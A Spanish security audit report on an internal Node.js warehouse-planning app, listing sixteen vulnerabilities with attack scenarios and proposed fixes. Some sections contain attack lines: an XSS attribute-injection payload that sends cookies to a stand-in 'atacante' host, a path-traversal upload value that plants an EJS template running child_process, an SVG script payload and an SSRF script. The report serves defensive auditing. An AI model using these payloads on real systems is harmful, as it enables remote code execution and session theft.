# Informe de vulnerabilidades — Planificador v3-node

Fecha: 2026-10-01

No se ha modificado ningún archivo del proyecto durante esta auditoría — es un informe, no una implementación.

## 1. Resumen ejecutivo

| Severidad | Nº hallazgos |
|---|---|
| 🔴 Crítica | 2 |
| 🟠 Alta | 4 |
| 🟡 Media | 5 |
| 🟢 Baja | 3 |
| ⚪ Informativa | 2 |
| **Total** | **16** |

Los dos hallazgos críticos (path traversal con escritura arbitraria de ficheros, y secreto de sesión predecible por defecto) son explotables por **cualquier usuario autenticado de bajo privilegio** (operario de almacén/kiosko PDA) o por alguien con visión del código fuente, y en el peor caso derivan en ejecución remota de código o suplantación total de sesión — por eso se mantiene la severidad alta incluso tratándose de una app solo-LAN, donde el actor realista es un insider, un kiosko comprometido o malware en la red corporativa, no un atacante de Internet.

## 2. Tabla de hallazgos

| Severidad | Componente | Resumen |
|---|---|---|
| 🔴 Crítica | `cdmuellesAlmacenes/controller.js`, `consignacion/routes.js` | Path traversal en el nombre de fichero subido (parámetro `id`/`idplanigrid` sin validar) → escritura arbitraria en el filesystem, potencial RCE vía sobrescritura de vistas `.ejs`. |
| 🔴 Crítica | `server/app.js` + `.env` | `SESSION_SECRET` no está definido en `.env`; la app usa el valor por defecto hardcodeado en el código fuente (`'planificador-v2-dev-secret'`) → cookies de sesión firmables/forjables por cualquiera con acceso al repo. |
| 🟠 Alta | `auth/repository.js`, `auth/routes.js` | Login por PIN en texto plano, sin hash, sin límite de intentos ni bloqueo; login PDA sin usuario, solo PIN. Documentado como "a petición expresa, no modificar". |
| 🟠 Alta | `public/assets/*.js`, `views/modals/consignacion.ejs`, `views/partials/header-muelles.ejs` | Patrón sistemático `html += ...; elemento.innerHTML = html` sin escapar, en al menos 12 ficheros. Confirmado también en atributos HTML (`item.albaran`) sin comillas escapadas. |
| 🟠 Alta | `cdmuellesAlmacenes`, `consignacion` uploads + `express.static` en `app.js` | Subida de ficheros sin validar tipo/extensión real (se confía en `path.extname(originalname)`), servidos después por `express.static` sin autenticación ni `Content-Type`/`nosniff` → stored XSS vía `.html`/`.svg` subido. |
| 🟠 Alta | `server/config/auth.js` (`csrfToken`/`verifyCsrfToken`) | Funciones CSRF implementadas pero **nunca invocadas** desde ningún router → ninguna ruta de estado está protegida contra CSRF; cookie de sesión sin `sameSite` explícito. |
| 🟡 Media | `server/modules/*/routes.js` (multer) | `multer()`/`multer({storage})` sin `limits.fileSize`/`limits.files` en casi todos los módulos; agravado porque `cdmuellesAlmacenes` usa `memoryStorage()` (buffer completo en RAM) y la app corre en PM2 **fork único** (sin redundancia). |
| 🟡 Media | `server/config/database.js:65` | `trustServerCertificate: true` → no valida el certificado TLS del SQL Server, abre puerta a MITM dentro de la LAN. |
| 🟡 Media | `server/config/deliveryOrderApi.js` | Login y llamadas al API de contenedores (192.168.2.145:8081) por **HTTP plano**, usuario/contraseña y token Bearer viajan en claro por la red. |
| 🟡 Media | `views/informes/_checksCalidad.ejs:60`, `pdfService.js` | `campohtml` se renderiza sin escapar (`<%- %>`) dentro del HTML que luego procesa Chromium headless (`--no-sandbox`, JS habilitado) para generar el PDF → vector secundario de inyección HTML/JS en el proceso de renderizado. |
| 🟡 Media | Toda la app | Ausencia de `helmet` (o cabeceras equivalentes): sin CSP, sin `X-Content-Type-Options`, sin `X-Frame-Options` → ninguna capa de defensa en profundidad frente a los XSS ya detectados. |
| 🟢 Baja | `.env` | Credenciales adicionales ("PRO"/"DEV" del API de contenedores) guardadas como **comentarios en texto plano** dentro del propio `.env`, además de las variables ya usadas. |
| 🟢 Baja | `deliveryOrderApi.js#actualizarTokenEnEnvFile` | Reescritura del token en `.env` en disco en cada login (texto plano, sin permisos de fichero reforzados); riesgo si se hacen backups/copias sin cifrar. |
| 🟢 Baja | `bin/informes/hoja-carga-2-automate.js:60-67` | Ruta de red de escritura (`data.ruta`, `data.propietario`) tomada directamente de BD sin validar antes de `fs.mkdirSync`/`fs.writeFileSync` y de construir una ruta UNC. |
| ⚪ Informativa | `tests/` | Sin cobertura de seguridad automatizada (XSS, auth, path traversal). |
| ⚪ Informativa | `C:\planificador ramon\planificador` (PHP legado) | Mismo esquema de sesión (8h) sin confirmar `httponly`/`secure` explícitos; revisar si sigue sirviendo tráfico en paralelo (superficie duplicada). |

## 3. Detalle por hallazgo

### 🔴 Crítica — Path traversal / escritura arbitraria de ficheros en subida de imágenes

**Dónde:** `server/modules/cdmuellesAlmacenes/controller.js:82-94` (función `subirImagenes`) y de forma análoga `server/modules/consignacion/routes.js:46-67` (callback `filename` de `multer.diskStorage`).

```js
// cdmuellesAlmacenes/controller.js
const nombreArchivo = files[i].originalname;
const extension = path.extname(nombreArchivo).replace(/^\./, '');
let fichero = `IMG_${id}_${i + 1}.${extension}`;   // <- id = String(req.body.id || ''), SIN VALIDAR
let rutaCompleta = path.join(rutaEscritura, fichero);
...
fs.writeFileSync(rutaCompleta, files[i].buffer);
```

`id` llega directamente de `req.body.id` (en `routes.js:119`: `const id = String(req.body.id || '')`) sin ninguna validación de formato (se espera que sea numérico, pero nada lo obliga). Se confirmó con una prueba de concepto local (`path.join`) que basta con incluir secuencias `../` dentro de `id` para que el fichero resultante se escriba **fuera** de `storage/uploads/cdmuelles/<fecha>/`, en cualquier ruta donde la cuenta de servicio de Node/PM2 tenga permisos de escritura (por ejemplo, `views/pages/login.ejs`, `ecosystem.config.js`, o rutas del sistema).

En `consignacion/routes.js` el mismo patrón existe con `idplanigrid`, que además se fija vía `req.session.idplanigrid = String(req.body.id || '')` (línea ~107) sin validar que sea numérico — mismo vector, mismo endpoint `/api/consignacion.php` protegido solo por `requireLoginApi()`.

**Escenario de ataque:** un operario autenticado en el kiosko (o un atacante que comprometa un PDA/kiosko, que son dispositivos físicamente expuestos en el muelle) envía una petición `multipart/form-data` a `/api/cdmuelles/subir-imagen.php` con `id=../../../../../../views/pages/login` y un fichero `imagen.ejs` cuyo contenido es una plantilla EJS con `<% require('child_process').exec(...) %>`. El servidor sobrescribe `views/pages/login.ejs` con ese contenido. La próxima vez que cualquier usuario visite `/login.php`, el motor EJS ejecuta el código arbitrario con los privilegios del proceso Node → **RCE** en el servidor que aloja PM2.

**Severidad real en LAN:** sigue siendo crítica. El actor no necesita estar en Internet: cualquier empleado con sesión válida en un kiosko PDA (superficie amplia: decenas de usuarios internos) puede ejecutarlo. Es exactamente el tipo de vulnerabilidad donde "solo intranet" no mitiga nada porque el atacante objetivo ya está dentro.

**Corrección propuesta:**
```js
function idSeguro(valor) {
  if (!/^\d+$/.test(String(valor))) {
    throw new Error('id inválido');
  }
  return String(valor);
}

const EXTENSIONES_PERMITIDAS = new Set(['jpg', 'jpeg', 'png', 'webp']);

const id = idSeguro(req.body.id);
const extension = path.extname(nombreArchivo).replace(/^\./, '').toLowerCase();
if (!EXTENSIONES_PERMITIDAS.has(extension)) {
  throw new Error('Tipo de fichero no permitido');
}
const fichero = path.basename(`IMG_${id}_${i + 1}.${extension}`); // defensa en profundidad
const rutaCompleta = path.join(rutaEscritura, fichero);
if (!rutaCompleta.startsWith(path.resolve(rutaEscritura) + path.sep)) {
  throw new Error('Ruta de destino inválida');
}
```
Aplicar el mismo patrón en `consignacion/routes.js` (tanto al fijar `req.session.idplanigrid` como en el callback `filename`), y añadir `fileFilter` a `multer` para rechazar tipos MIME no esperados desde el propio multer, no solo por extensión.

---

### 🔴 Crítica — `SESSION_SECRET` ausente en `.env`, usando el valor por defecto hardcodeado

**Dónde:** `server/app.js:43`
```js
secret: env.get('SESSION_SECRET', 'planificador-v2-dev-secret'),
```
Se confirmó leyendo el `.env` real del proyecto que **no existe** una clave `SESSION_SECRET` — por tanto la app en producción está firmando todas las cookies de sesión con el literal `'planificador-v2-dev-secret'`, que está en el código fuente (visible a cualquiera con acceso al repositorio, incluidos antiguos colaboradores, backups, o una futura fuga del repo).

**Escenario de ataque:** cualquiera que conozca (o deduzca) ese secreto por defecto puede construir y firmar con `express-session`/`cookie-signature` una cookie `PLANIFICADOR_SESSID` válida con `req.session.usuario = "cualquiera"` y `rol` arbitrario, sin necesidad de conocer ningún PIN, saltándose por completo la autenticación. Esto incluye a cualquier desarrollador actual o pasado con acceso al repo, y a cualquiera que obtenga una copia del código.

**Severidad real en LAN:** crítica igualmente — no depende de la topología de red, depende de quién conoce el secreto (que está en el código, no en un lugar protegido).

**Corrección propuesta:**
```js
secret: env.required('SESSION_SECRET'),
```
y añadir en `.env` un valor aleatorio fuerte generado una sola vez, p. ej.:
```
SESSION_SECRET=<resultado de: node -e "console.log(require('crypto').randomBytes(48).toString('hex'))">
```
Esto hará que el arranque falle ruidosamente si falta la variable, en vez de degradar silenciosamente la seguridad — es el comportamiento "seguro por defecto" deseable. Aprovechar el cambio para añadir también `cookie.sameSite: 'lax'` (o `'strict'` si no rompe los flujos de los kioscos) y evaluar `cookie.secure` cuando se habilite TLS interno.

---

### 🟠 Alta — Autenticación por PIN sin rate limiting ni hashing

**Dónde:** `server/modules/auth/repository.js:1-58`, comentario explícito: *"PIN en texto plano comparado contra usuarios.pin, sin hash y sin límite de intentos — comportamiento mantenido tal cual a petición expresa, no modificar"*. `loginPda` (línea 32) ni siquiera exige usuario, solo PIN.

**Escenario de ataque:** un dispositivo en la red del almacén (o cualquier insider) puede automatizar peticiones a `POST /api/login.php` probando PINs secuenciales; sin límite de intentos ni bloqueo de cuenta, y con `loginPda` sin exigir usuario, el espacio de búsqueda se reduce al PIN únicamente. Si los PINs son cortos, un ataque de fuerza bruta es trivial y rápido incluso sin herramientas sofisticadas.

**Severidad real en LAN:** se mantiene Alta — aunque el atacante necesita estar en la red corporativa, en un almacén logístico con kioscos físicos y Wi-Fi, "estar en la LAN" es un listón bajo.

**Corrección propuesta (sin tocar el esquema de PIN, que el equipo pidió no modificar):** añadir una capa de mitigación independiente de la lógica de negocio:
```js
// server/config/rateLimitLogin.js (nuevo, middleware ligero sin dependencias)
const intentos = new Map(); // IP -> { count, resetAt }
function limitarLogin(maxIntentos = 5, ventanaMs = 15 * 60 * 1000) {
  return (req, res, next) => {
    const clave = req.ip;
    const ahora = Date.now();
    const estado = intentos.get(clave);
    if (!estado || estado.resetAt < ahora) {
      intentos.set(clave, { count: 1, resetAt: ahora + ventanaMs });
      return next();
    }
    if (estado.count >= maxIntentos) {
      return res.status(429).json({ status: 'error', mensaje: 'Demasiados intentos, espera unos minutos' });
    }
    estado.count++;
    next();
  };
}
module.exports = limitarLogin;
```
Aplicarlo en `router.post('/api/login.php', limitarLogin(), upload.none(), ...)`. Adicionalmente, registrar en BD los intentos fallidos por usuario para poder auditar/alertar, y considerar alargar el PIN o añadir un segundo factor (p. ej., que el PDA deba estar en una IP/VLAN del almacén, verificable server-side) como mitigación adicional ya que no se puede tocar el hashing.

---

### 🟠 Alta — XSS por concatenación de HTML + `innerHTML` sin escapar (generalizado)

**Dónde (confirmado, no exhaustivo):** `public/assets/planificador.js`, `historico.js`, `visor-almacen.js`, `comunes.js`, `configuracion.js`, `calendario.js`, `cdmuelles/cdmuelles-ordenes.js`, `cdmuelles/cdmuelles-fotos.js`, `cdmuelles/cdmuelles-calidad.js`, `celectronica/celectronica.js`; y en vistas: `views/modals/consignacion.ejs`, `views/partials/header-muelles.ejs`.

Ejemplo concreto, `public/assets/cdmuelles/cdmuelles-ordenes.js:507`:
```js
html += '<tr albaran="' + item.albaran + '" inout="' + item.inout + '" bultos="' + item.bultos + '" idplanigrid="' + item.idplanigrid + '">';
```
`item.albaran` se interpola dentro de un **atributo HTML entre comillas dobles sin escapar**. Si ese valor (número de albarán, originado en Whales/sistema externo o en entradas manuales previas) contiene una comilla doble, el atacante puede cerrar el atributo e inyectar atributos/eventos arbitrarios, p. ej. un valor `"` + `onmouseover="fetch('http://atacante/x?c='+document.cookie)"` rompe el atributo `albaran` e inyecta un manejador de evento ejecutado con la sesión de cualquier usuario (incluido un Jefe de Turno) que simplemente pase el ratón por esa fila.

**Escenario de ataque:** cualquier dato que llegue desde `WhalesAza` (sistema externo) o desde campos de texto libre rellenados por operarios (observaciones, descripciones) y que posteriormente se muestre en cualquiera de estas pantallas, puede contener HTML/JS que se ejecuta en el navegador de **otro** usuario que visualice esa tabla — stored/second-order XSS clásico. Dado que la cookie de sesión es `httpOnly` (mitiga robo directo vía `document.cookie`), el impacto principal es **acción en nombre de la víctima** (fetch con `credentials: 'include'` a cualquier endpoint autenticado) y manipulación de la UI (phishing in-app), no exfiltración directa de la cookie.

**Severidad real en LAN:** Alta, no se rebaja mucho: el origen del payload (Whales, sistema externo fuera del control de este equipo) hace que "solo LAN" no limite quién puede sembrar el dato malicioso en origen.

**Corrección propuesta:**
- Construcción de nodos DOM (`document.createElement` + `textContent`) en vez de `innerHTML`, o
- Una función de escape centralizada reutilizada en todos los módulos:
```js
function escapeHtml(valor) {
  return String(valor ?? '').replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[c]));
}
// uso:
html += '<tr albaran="' + escapeHtml(item.albaran) + '" ...>';
```
Dado el volumen de ficheros afectados, priorizar primero los que reciben datos de `WhalesAza` o de campos de observaciones/texto libre, y tratarlo como una tarea de refactor transversal con un linter/regla (p. ej. ESLint `no-unsanitized/property`) que impida nuevos `innerHTML =` con concatenación sin pasar por `escapeHtml`.

---

### 🟠 Alta — Subida de ficheros sin validar tipo real + servidos sin autenticación

**Dónde:** `server/app.js:76-77` (montaje de alias estáticos `uploadsFirmasAlias`/`uploadsCdmuellesAlias` vía `express.static`, sin middleware de auth delante) + los controladores de subida ya citados, que solo confían en la extensión del nombre original del fichero.

**Escenario de ataque:** un usuario autenticado en cualquiera de los módulos de subida (`consignacion`, `cdmuellesAlmacenes`) sube un fichero llamado `prueba.svg` con contenido:
```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>fetch('/api/cdmuelles/...', {credentials:'include', method:'POST', ...})</script></svg>
```
o `prueba.html` con un `<script>`. El servidor lo guarda tal cual bajo `storage/uploads/cdmuelles/AAAA/MM/DD/IMG_<id>_N.svg`, y `express.static` lo sirve en `/uploads/cdmuelles/AAAA/MM/DD/...` **sin requerir sesión** y con `Content-Type: image/svg+xml` o `text/html` (según el mime-type deducido de la extensión, sin `X-Content-Type-Options: nosniff`). Cualquiera que abra ese enlace directamente (compartido, indexado, o enlazado desde la galería de imágenes visible a otros usuarios autenticados) ejecuta el script en el origen de la aplicación.

**Severidad real en LAN:** Alta — es una vía de stored XSS independiente de la de los `innerHTML`, y encima no requiere que el atacante controle datos de Whales: le basta con tener sesión válida en cualquiera de estos módulos.

**Corrección propuesta:**
```js
const multer = require('multer');
const MIME_PERMITIDOS = new Set(['image/jpeg', 'image/png', 'image/webp']);

const upload = multer({
  storage,
  limits: { fileSize: 8 * 1024 * 1024, files: 20 },
  fileFilter(req, file, cb) {
    cb(null, MIME_PERMITIDOS.has(file.mimetype));
  },
});
```
Como defensa en profundidad adicional (por si `file.mimetype`, que viene del cliente, se falsea): verificar los "magic bytes" del buffer antes de escribir a disco (p. ej. con `file-type` o comprobando la cabecera PNG/JPEG manualmente), forzar la extensión de salida según el tipo detectado (ignorar la extensión del cliente) y añadir `res.set('X-Content-Type-Options', 'nosniff')` al montar los alias estáticos, o servir estos ficheros desde un subdominio/puerto distinto sin cookies de sesión asociadas.

---

### 🟠 Alta — CSRF: protección implementada pero no aplicada

**Dónde:** `server/config/auth.js:63-77` (`csrfToken`, `verifyCsrfToken`) — confirmado por `grep` en todo `server/` que **ninguna ruta las invoca**. Además, `server/app.js:47-50` no fija `sameSite` en la cookie de sesión, dejando el comportamiento al valor por defecto del navegador.

**Escenario de ataque:** si un usuario con sesión activa visita (o es engañado para visitar) una página externa maliciosa mientras tiene la pestaña/app del Planificador abierta, esa página puede intentar disparar peticiones `POST` a endpoints de estado (p. ej. `/api/consignacion.php` con `funcion=eliminarFoto`, o `/api/cdmuelles/eliminar-foto.php`). En navegadores modernos con `SameSite=Lax` por defecto (al no fijarse explícitamente) esto queda parcialmente mitigado para peticiones cross-site "no seguras" (POST), pero **no está garantizado** en WebViews antiguos — relevante aquí porque existe un directorio de trabajo adicional `MDM-AzaLogistics/android` que sugiere que los kioscos PDA pueden usar un WebView Android embebido, cuya versión de Chromium/WebView determina si aplica o no el `SameSite=Lax` implícito.

**Severidad real en LAN:** Media-Alta — el vector de entrada ("usuario visita una página externa") es menos probable en un kiosko dedicado de almacén que en un puesto de oficina con navegación libre, pero el código de mitigación existe y simplemente no se usa, lo cual es una brecha fácil de cerrar.

**Corrección propuesta:**
```js
// server/app.js
cookie: {
  httpOnly: true,
  sameSite: 'lax', // o 'strict' si los flujos lo permiten
  maxAge: 8 * 60 * 60 * 1000,
},
```
y, para las rutas de estado más sensibles (borrados, cambios de datos), exponer el `csrfToken` ya existente en una variable de plantilla (`res.locals.csrfToken = auth.csrfToken(req)`), incluirlo como cabecera `X-CSRF-Token` en los `fetch()` del frontend, y validar con `auth.verifyCsrfToken(req, req.get('X-CSRF-Token'))` en un middleware aplicado a todos los routers `POST`/`PUT`/`DELETE`.

---

### 🟡 Media — `multer` sin límites configurados (DoS)

**Dónde:** prácticamente todos los `server/modules/*/routes.js` (`auth`, `visorAlmacen`, `calendario`, `planificador`, `historico`, `muelles`, `configuracion`, `celectronica`, `consignacion`, `cdmuellesAlmacenes`).

**Escenario de ataque:** sin `limits.fileSize`, un cliente (malicioso o simplemente un PDA con un fichero mal nombrado) puede subir ficheros de tamaño arbitrario. En `cdmuellesAlmacenes` esto es más grave porque usa `multer.memoryStorage()` — el fichero completo se carga en RAM del proceso Node antes de escribirse a disco. Como la app corre en **PM2 fork único** (una sola instancia, documentado explícitamente en `ecosystem.config.js` por la limitación de `MemoryStore`), una subida (o varias concurrentes) suficientemente grande puede disparar `max_memory_restart: '500M'` y reiniciar el único proceso que sirve a **todo el almacén**, causando una caída total momentánea para todos los operarios y kioscos simultáneamente.

**Severidad real en LAN:** Media — el actor necesario (alguien con sesión válida) está limitado a la LAN, pero el impacto (caída total del único proceso) es desproporcionado para un error trivial o una subida accidental, no solo un ataque deliberado.

**Corrección propuesta:**
```js
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 8 * 1024 * 1024, files: 20 },
});
```
Aplicar un límite razonable (p. ej. 8-10 MB por imagen) en cada módulo, y capturar el error `LIMIT_FILE_SIZE` de multer para devolver un 413 controlado en vez de dejar que el proceso llegue a agotar memoria.

---

### 🟡 Media — SQL Server con `trustServerCertificate: true`

**Dónde:** `server/config/database.js:64-69`.

**Escenario de ataque:** la conexión TLS a `SRVWhalesUAT.zar.local` no valida el certificado del servidor, lo que permite a un atacante con capacidad de intercepción en la red interna (switch comprometido, ARP spoofing, etc.) hacerse pasar por el servidor SQL y capturar/alterar credenciales y datos en tránsito.

**Severidad real en LAN:** Baja-Media — mitigado significativamente por tratarse de tráfico dentro del dominio `zar.local`, pero sigue siendo una configuración "insegura por defecto" frente a la alternativa correcta.

**Corrección propuesta:** emitir/instalar un certificado válido (interno, de la CA del dominio AD) en el SQL Server y cambiar a:
```js
options: {
  trustServerCertificate: false,
  encrypt: true,
  ...
}
```

---

### 🟡 Media — Integración API de contenedores por HTTP plano

**Dónde:** `server/config/deliveryOrderApi.js` + `.env` (`CONTAINER_API_LOGIN_URL=http://192.168.2.145:8081/login`, confirmado sin HTTPS).

**Escenario de ataque:** usuario/contraseña del login y el token Bearer resultante viajan sin cifrar por la red interna en cada llamada (`llamarProc`, cabecera `Authorization: Bearer <token>`). Cualquiera con capacidad de sniffing en ese segmento de red puede capturar credenciales y token, y suplantar al Planificador frente al API de contenedores.

**Severidad real en LAN:** Media — mitigado por ser tráfico interno, pero las credenciales en juego (usuario `interfaz` con password visible en el propio `.env` incluso en comentarios) hacen que el coste de explotación sea bajo si un atacante ya está en el segmento de red del 192.168.2.0/24.

**Corrección propuesta:** solicitar al propietario de ese API que exponga HTTPS (aunque sea con certificado autofirmado de CA interna) y actualizar las URLs a `https://`. Mientras tanto, documentar el riesgo residual y restringir por firewall qué hosts pueden hablar con el puerto 8081.

---

### 🟡 Media — HTML sin escapar dentro de la generación de PDF (Chromium headless)

**Dónde:** `views/informes/_checksCalidad.ejs:60` (`<%- textoFila(fila, indice) %>`) junto con `server/modules/informes/pdfService.js` (que reutiliza un único proceso Chromium persistente con `--no-sandbox` para todas las peticiones de PDF concurrentes).

El propio comentario del código documenta que `campohtml` (pregunta de calidad almacenada en BD) se pinta deliberadamente sin escapar, replicando el comportamiento del PHP original, y solo se eliminan etiquetas `<input>/<textarea>/<select>/<button>` por regex — cualquier otra etiqueta (incluyendo `<script>`, `<img onerror=...>`, o un `<iframe src="http://host-interno/...">`) pasa intacta a `page.setContent()`.

**Escenario de ataque:** si alguien con acceso de escritura a la tabla de configuración de "preguntas de calidad" introduce un `<script>fetch('http://192.168.x.x/endpoint-interno')</script>` en `campohtml`, ese script se ejecuta dentro del proceso Chromium headless (con JS habilitado por defecto y `--no-sandbox`) cada vez que se genera cualquier Hoja de Carga/Descarga. Dado que Chromium corre en el mismo host que el resto de servicios internos y sin sandbox del SO, esto abre una vía de **SSRF** y, en el peor caso, de explotación de vulnerabilidades del propio motor Chromium al estar sin sandbox.

**Severidad real en LAN:** Media — la superficie de entrada (escribir en la tabla de preguntas de calidad) está limitada a usuarios con privilegios administrativos sobre esa configuración, no a cualquier operario, lo que reduce la probabilidad frente a los XSS de más arriba.

**Corrección propuesta:** sanear con una lista blanca de etiquetas permitidas (p. ej. `sanitize-html` con solo `<br>`, `<b>`, `<i>`, `<span style="...">` permitidos) en vez de solo quitar los controles de formulario. Como defensa en profundidad adicional, lanzar Chromium sin `--no-sandbox` si el entorno lo permite, o al menos sin acceso de red saliente hacia hosts no necesarios.

---

### 🟡 Media — Ausencia de cabeceras de seguridad (helmet/CSP)

**Dónde:** `server/app.js` — no hay `helmet` ni ninguna cabecera `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy` en todo el pipeline (confirmado: no está en `package.json` como dependencia).

**Escenario de ataque:** dado que ya existen múltiples vectores de XSS confirmados, la falta de una CSP que restrinja `script-src` es la diferencia entre "un XSS ejecuta cualquier script" y "un XSS queda neutralizado". También faltan protecciones baratas como `X-Frame-Options: DENY` (clickjacking) y `X-Content-Type-Options: nosniff`.

**Severidad real en LAN:** Media — no es un vector de ataque en sí mismo, pero multiplica el impacto de los XSS ya encontrados.

**Corrección propuesta:**
```js
const helmet = require('helmet');
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],
    },
  },
}));
```
Nota: dado el uso extendido de atributos `onclick="..."` inline en el HTML generado dinámicamente, una CSP estricta con `scriptSrc: ["'self'"]` romperá funcionalidad hasta que se migren esos manejadores a `addEventListener`; desplegarla primero en modo `Content-Security-Policy-Report-Only` para medir el impacto.

---

### 🟢 Baja — Credenciales adicionales en comentarios de `.env`

**Dónde:** `.env` contiene, además de las variables activas, un par de líneas de comentario con usuario/contraseña "PRO" y "DEV" adicionales en texto plano para el mismo API.

**Por qué es un problema:** aunque `.env` está correctamente excluido de git, sigue siendo un fichero de texto plano en disco; guardar credenciales "por si acaso" multiplica el número de secretos vivos en el mismo fichero.

**Corrección propuesta:** eliminar esas líneas de comentario y, si son necesarias como referencia, moverlas a un gestor de secretos.

---

### 🟢 Baja — Reescritura de `CONTAINER_API_TOKEN` en `.env` en disco

**Dónde:** `server/config/deliveryOrderApi.js#actualizarTokenEnEnvFile` (líneas 25-34).

**Por qué es un problema:** cada vez que expira el token, la app reescribe físicamente el `.env` de producción con un `replace`/regex no atómico. Un fallo a mitad de escritura podría corromper el `.env` entero y tumbar el arranque de la app.

**Corrección propuesta:** escribir primero a un fichero temporal y renombrar (`fs.writeFileSync(tmp, ...); fs.renameSync(tmp, RUTA_ENV)`), atómico a nivel de sistema de ficheros, o separar el token en un fichero propio en vez de mezclarlo con el resto de secretos estructurales.

---

### 🟢 Baja — Ruta de red sin validar en proceso batch

**Dónde:** `bin/informes/hoja-carga-2-automate.js:60-67` — `data.ruta`/`data.propietario` se usan directamente en `fs.mkdirSync`/`fs.writeFileSync` y en la construcción de una ruta UNC sin sanear.

**Corrección propuesta:** validar que `data.ruta` cae dentro de una lista blanca de rutas base esperadas antes de `mkdirSync`/`writeFileSync`.

---

### ⚪ Informativa — Sin tests de seguridad / PHP legado en paralelo

`tests/` vacío. Respecto al PHP legado en `C:\planificador ramon\planificador`: no se encontró `sqlsrv_query` con concatenación directa de `$_GET`/`$_POST` (búsqueda no exhaustiva), y la configuración de sesión es consistente con la réplica en Node. Recomendado confirmar que esa copia PHP ya no sirve tráfico real en producción, para no mantener dos superficies de ataque vivas simultáneamente.

## 4. Recomendaciones generales (priorizadas)

1. **Gestión de secretos**: definir `SESSION_SECRET` ya (bloqueante), y a medio plazo migrar `.env` a un almacén de secretos gestionado (Windows DPAPI/Credential Manager, HashiCorp Vault, o como mínimo cifrar el `.env` en reposo con permisos NTFS restringidos solo a la cuenta de servicio de PM2).
2. **Cerrar el path traversal en subidas** (crítico, afecta a dos módulos) — validar `id` como entero positivo y usar `path.basename()` + comprobación de que la ruta final permanece dentro del directorio esperado.
3. **Centralizar el escapado HTML** en el frontend (una función `escapeHtml` compartida, o migrar a plantillas/DOM API) y añadirlo como regla de lint para evitar regresiones.
4. **Validar tipo real de fichero subido** (`fileFilter` + comprobación de magic bytes) y añadir `limits` a todas las instancias de `multer`.
5. **Activar CSRF** (código ya existe, solo falta conectarlo) + `sameSite` en la cookie de sesión.
6. **Helmet/CSP** como capa de defensa en profundidad, desplegado primero en modo report-only.
7. **HTTPS interno**: emitir certificados de la CA del dominio `zar.local` para el propio Planificador, para SQL Server (`trustServerCertificate: false`) y para el API de contenedores.
8. **Rate limiting / lockout en login**, como mitigación independiente del esquema de PIN.
9. Añadir tests mínimos de regresión de seguridad una vez corregidos los hallazgos críticos.

## Archivos relevantes citados

- `server/app.js`
- `server/config/auth.js`
- `server/config/database.js`
- `server/config/deliveryOrderApi.js`
- `server/config/env.js`
- `server/config/appConfig.js`
- `server/modules/auth/repository.js`
- `server/modules/auth/routes.js`
- `server/modules/cdmuellesAlmacenes/controller.js`
- `server/modules/cdmuellesAlmacenes/routes.js`
- `server/modules/consignacion/routes.js`
- `server/modules/celectronica/controller.js`
- `server/modules/informes/pdfService.js`
- `views/informes/_checksCalidad.ejs`
- `public/assets/cdmuelles/cdmuelles-ordenes.js`
- `public/assets/configuracion.js`
- `views/partials/header-muelles.ejs`
- `bin/informes/hoja-carga-2-automate.js`
- `.env` (no incluido en git; revisado localmente, sus secretos no se han reproducido en este informe)
- `ecosystem.config.js`
- `package.json`
